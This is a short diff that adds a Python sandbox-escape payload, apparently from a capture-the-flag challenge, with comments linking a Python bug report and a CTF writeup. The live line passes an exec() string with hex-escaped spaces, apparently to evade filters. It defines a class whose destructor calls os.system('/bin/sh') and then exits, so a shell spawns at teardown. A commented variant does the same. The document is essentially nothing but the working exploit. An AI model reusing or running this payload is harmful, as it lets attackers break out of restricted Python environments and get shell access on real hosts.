@@ -1,0 +1,3 @@
+# See: https://bugs.python.org/issue41162 and https://ctftime.org/writeup/21982
+# exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit(0)")
+exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\na=X()\nsys.exit(0)")
